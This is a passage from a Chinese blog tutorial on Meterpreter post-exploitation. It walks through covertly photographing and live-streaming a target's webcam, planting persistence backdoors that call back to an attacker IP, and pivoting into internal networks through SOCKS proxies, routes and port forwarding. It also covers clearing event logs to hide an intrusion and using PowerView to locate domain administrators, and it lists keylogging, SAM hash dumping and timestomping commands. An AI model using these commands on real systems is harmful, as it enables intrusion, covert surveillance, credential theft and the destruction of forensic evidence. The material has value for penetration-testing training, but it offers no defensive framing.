![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0PWcYbFsLHVH4vegyQ3pqYfBSk7h12jg0l4UPZ47kXnrlVc7jc6lwAg/640?wx_fmt=png)

于是，我们拍一张照片看看，可以看到，已经拍完了照，并且显示出来了

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0icIuzQCXc5hbZPoJhaxm5knj1ficNYcliauJZPQfAiagdq1Ajubk4gaRww/640?wx_fmt=png)

我们再来开启视频试试，开启摄像头拍摄视频。他会弹出一个网页，可以查看到摄像头那端的实时操作，相当于直播

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0hhK7ibgJKvcCJNHvRNmgAib0SAHWibaH2Wy2DnfdboPmAGab0ZK9WNDWQ/640?wx_fmt=png)

###   

### 使用扩展库

输入 load 或者 run  然后双击 table

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0nz2OmiaxEjt3wWiaFkkLKPsWxHSPL54uWibo0QAWycPlsjxWzXV6vo6Yw/640?wx_fmt=png)

###   

### 生成持续性后门

因为 meterpreter 是基于内存 DLL 建立的连接，所以，只要目标主机关机，我们的连接就会断。总不可能我们每次想连接的时候，每次都去攻击，然后再利用 meterpreter 建立连接。所以，我们得在目标主机系统内留下一个持续性的后门，只要目标主机开机了，我们就可以连接到该主机。

建立持续性后门有两种方法，一种是通过**启动项启动 (persistence) ，**一种是通过 **服务启动 (metsvc)**

**启动项启动**

启动项启动的话，我们先生成一个后门工具，传送门——> 用 MSF 生成一个后门木马

然后放到 windows 的启动目录中：

```
C:\Users\$username$\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

这样这个后门每次开机就都能启动了，然后我们只要相连就监听相应的端口就行了。

**服务启动**

通过服务启动，我们可以运行命令 

```
run persistence -X -i 5 -p 8888 -r 192.168.10.27  #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀
 
#然后它就在目标机新建了这个文件：C:\Windows\TEMP\CJzhFlNOWa.vbs ，并把该服务加入了注册表中，只要开机就会启
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI09rH6cOpIrib4NtRHP7wH69mowwI0j4ibmMh977ialD9uTgicrbfnEYdjibA/640?wx_fmt=png)

我们在被攻击机可以看到这个文件，是一个 VBScript 脚本

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0ahPploBAofpAWrWGH3OEQkyIuLdpQHl1icm6ITSiazWNVu7A6fZoIGXA/640?wx_fmt=png)

查看靶机的端口连接情况，可以看到靶机连着我们的 8888 端口

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0lIrSnFYZqFo6N7CNJFrcBicHa4qXsXLSbAltwB3YMpedD2icibP6HC0pQ/640?wx_fmt=png)

###   

### 设置 Socks 代理

这里 socks 模块只是将代理设置为本地的 1080 端口，即通过 proxychains 的流量都转给本地的 1080 端口，又因为这是 MSF 起的监听端口。所以我们需要添加一个路由，这样 MSF 监听的 1080 端口就可以到达内网了。

MSF 中有三个代理模块，分别是 socks4a、socks5、socks_unc。我们一般用 socks4a 和 socks5 进行代理。socks5 可以设置用户名和密码。这里运行代理后，有时候 MSF 不会监听端口 (有可能是个 bug，试了好多次都有这种情况)，所以也就导致代理失败。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0DDwMKzfcnC6ARoK8ibULiaC29aBmMpapGS1vKpo0pORCgLiastpmT0mNA/640?wx_fmt=png)

```
#使用socks4a代理
use auxiliary/server/socks5
run
 
#使用socks5代理
use auxiliary/server/socks5
set USERNAME root
set PASSWORD Password@
run
 
#然后打开/etc/proxychains.conf，加入下面一行
socks5 0.0.0.0 1080 root Password@
 
#然后添加路由
route add 0.0.0.0 0.0.0.0 1
 
#然后就可以使用curl了
proxychains nmap -p 21 -Pn -sT x.x.x.x     #在打开其他程序前加上proxychains
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI08AiaOSU0sw6h0dGGzwwHzszqgXIJNgfymMWVicgibia4dodVxHkaibUYNXQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0AAwovyIf0RCyVXNw7RZ2a5sG1iaMbScia2drfsbCJkq2XKoT5ghlYqyQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0zrXnZkspNZhq9zickpqQxIkXuTQArUicj8icyLFwIpg99GMKy6kLhPNuA/640?wx_fmt=png)

### portfwd 端口转发

```
portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址
```

portfwd 是 meterpreter 提供的一种基本的端口转发。porfwd 可以反弹单个端口到本地，并且监听，使用方法如下

### ![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0bd9lD8OwXjR0BJMpTf2wFt4sYW7oIWWNnibCia7y4yK2JrAQibDnfCgEg/640?wx_fmt=png)

然后我们只要访问本地的 3389 端口就可以连接到目标主机的 3389 端口了

```
rdesktop 127.0.0.1:3389
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0YBLJpOOStrwHWKDIgvUmyhcE4ic452ozc2OE8dYwictULcBmV3vbju7A/640?wx_fmt=png)

###   

### 清除事件日志

完成攻击操作之后，千万别忘了 “打扫战场”。我们的所有操作都会被记录在目标系统的日志文件之中，因此我们需要在完成攻击之后使用命令  clearev  命令来清除事件日志：

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0U0MnQ82BA0v0VjUEph3VtmfLqGaZ7UTc2Jm6ibaKpnNCTdribP7EXwfA/640?wx_fmt=png)

  

---

导入并执行 PowerShell 脚本
-------------------

```
load powershell            #加载powershell功能
powershell_import /root/PowerView.ps1      #导入powershell脚本，提前将该powershell脚本放到指定目录
powershell_execute Get-NetDomain     #执行该脚本下的功能模块Get-domain，该模块用于获取域信息，一个脚本下通常有多个功能模块
powershell_execute Invoke-UserHunter  #该功能模块用于定位域管理员登录的主机
powershell_execute Get-NetForest      #该模块用于定位域信息
```

如果 powershell 脚本是用于域内信息收集的，则获取到的权限用户需要是域用户

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0oCkictR24Ria2yHR8gD2iclq9ricreu29eXFZoowo2DrkwLSXiaWsx3ic8Sw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0Ez28WxowVicywRHsVjSe5Ky2AdGe6tjgUxciapkAAqqzcznf0Q78LZKQ/640?wx_fmt=png)

加载 stdapi
---------

有时候虽然我们获取到了 meterpreter，但是执行一些命令会显示没有该命令，这时我们可以执行：load stdapi 来加载，这样我们就可以执行命令了。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0C4kj92PcOAS6rBOtib2GdRGicic6sXAu1FY6p5ZXOh0MPibibfzARHKRkWg/640?wx_fmt=png)

  

---

升级 Session
----------

有时候，当我们收到的不是 meterpreter 类型的 session 的话，可能不好操作。我们可以执行命令  **sessions -u  id** 来升级 session。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0ZQPv4Gjc0gmpfeHsQYdpoUiaCCeuicCR6Ke1Q8giczxsc1eVyRqYGv1JA/640?wx_fmt=png)

  

---

Meterpreter 的更多用法
-----------------

**Core Commands   核心命令**  
=============  
    Command                   Description  
    -------                   -----------  
   **?**                            Help menu  
   **background**         Backgrounds the current session  
    bgkill                     Kills a background meterpreter script  
    bglist                     Lists running background scripts  
    bgrun                      Executes a meterpreter script as a background thread  
    channel                   Displays information or control active channels  
    close                      Closes a channel  
    disable_unicode_encoding   Disables encoding of unicode strings  
    enable_unicode_encoding   Enables encoding of unicode strings  
   **exit**                         Terminate the meterpreter session  
    get_timeouts              Get the current session timeout values  
   **help**                       Help menu  
  **info**                        Displays information about a Post module  
    irb                          Drop into irb scripting mode  
    load                       Load>**Stdapi: File system Commands 文件系统命令**  
============================  
    Command       Description  
    -------       -----------  
    cat           Read the contents of a file to the screen  
    cd            Change directory  
    dir           List files (alias for ls)  
   **download**      Download a file or directory  
    edit          Edit a file  
    getlwd        Print local working directory  
    getwd         Print working directory  
    lcd           Change local working directory  
    lpwd          Print local working directory  
 **ls**            List files  
    mkdir         Make directory  
    mv            Move source to destination  
    pwd           Print working directory  
    rm            Delete the specified file  
    rmdir         Remove directory  
    search        Search for files  
    show_mount    List all mount points/logical drives  
 **upload**        Upload a file or directory  
**Stdapi: Networking Commands 网络命令**  
===========================  
    Command       Description  
    -------       -----------  
    **arp**                Display the host ARP cache  
    getproxy       Display the current proxy configuration  
 **ifconfig**        Display interfaces  
    **ipconfig**      Display interfaces  
 **netstat**     Display the network connections  
    portfwd        Forward a local port to a remote service  
    route          View and modify the routing table  
**Stdapi: System Commands 系统命令**  
=======================  
   
    Command       Description  
    -------       -----------  
    clearev       Clear the event log  
    drop_token    Relinquishes any active impersonation token.  
    execute       Execute a command  
    getenv        Get>**Stdapi: User interface Commands 用户界面命令**  
===============================  
    Command        Description  
    -------        -----------  
    enumdesktops       List all accessible desktops and window stations  
    getdesktop             Get the current meterpreter desktop  
    idletime                    Returns the number of seconds the remote user has been idle  
    keyscan_dump       Dump the keystroke buffer  
    keyscan_start        Start capturing keystrokes  
    keyscan_stop        Stop capturing keystrokes  
 **screenshot**           Grab a screenshot of the interactive desktop  
    setdesktop              Change the meterpreters current desktop  
 **uictl**                       Control some of the user interface components  
**Stdapi: Webcam Commands 摄像头命令**  
=======================  
    Command        Description  
    -------        -----------  
    record_mic           Record audio from the default microphone for X seconds  
    webcam_chat       Start a video chat  
  **webcam_list**       List webcams  
   **webcam_snap**    Take a snapshot from the specified webcam  
    webcam_stream   Play a video stream from the specified webcam  
**Priv: Elevate Commands 提权命令**  
======================  
    Command       Description  
    -------       -----------  
 **getsystem**     Attempt to elevate your privilege to that of local system.  
**Priv: Password database Commands 密码**  
================================  
    Command       Description  
    -------       -----------  
 **hashdump**      Dumps the contents of the SAM database  
**Priv: Timestomp Commands 时间戳命令**  
========================  
    Command       Description  
    -------       -----------  
 **timestomp**     Manipulate file MACE attributes

![](https://mmbiz.qpic.cn/mmbiz_png/fgnkxfGnnkQOXicvmAQG04fXvhS1hMZEZ4QibMNx7MiadLtIicQfpaqwiazvwleO8XymZBCUokfOgg9uxydPTzZho5g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4bPsKsflkyUIGQBtwbrVON6aKpFXZCqiaJxibicEDVk4vC5BLSRDlk2ksibJPZxwdAWC17hqrUP1qptQ/640?wx_fmt=gif)

END

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4bPsKsflkyUIGQBtwbrVON6aKpFXZCqiaJxibicEDVk4vC5BLSRDlk2ksibJPZxwdAWC17hqrUP1qptQ/640?wx_fmt=gif)

来源：谢公子的博客

责编：Vivian

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2edCjiaG0xjojnN3pdR8wTrKhibQ3xVUhjlJEVqibQStgROJqic7fBuw2cJ2CQ3Muw9DTQqkgthIjZf7Q/640?wx_fmt=png)

由于文章篇幅较长，请大家耐心。如果文中有错误的地方，欢迎指出。有想转载的，可以留言我加白名单。

最后，欢迎加入谢公子的小黑屋（安全交流群）(QQ 群：783820465)

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SjCxEtGic0gSRL5ibeQyZWEGNKLmnd6Um2Vua5GK4DaxsSq08ZuH4Avew/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)